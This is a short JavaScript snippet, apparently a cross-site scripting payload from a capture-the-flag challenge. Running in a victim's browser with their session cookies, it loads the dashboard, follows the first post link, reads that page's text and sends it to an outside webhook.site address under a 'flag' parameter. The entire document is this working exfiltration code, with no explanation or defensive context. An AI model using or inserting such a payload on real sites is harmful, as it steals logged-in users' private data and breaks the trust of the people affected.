fetch('/dashboard', { credentials: 'include' })
  .then(response => response.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const links = doc.querySelectorAll('a[href^="/post/"]');
    if (links.length > 0) {
      const postUrl = links[0].href;
      fetch(postUrl, { credentials: 'include' })
        .then(response => response.text())
        .then(postHtml => {
          const postDoc = parser.parseFromString(postHtml, 'text/html');
          const bodyText = postDoc.body.innerText;
          fetch('https://webhook.site/3a31a108-66be-4cbd-bdbd-3eebc17567a3?flag=' + encodeURIComponent(bodyText));
        });
    }
  });
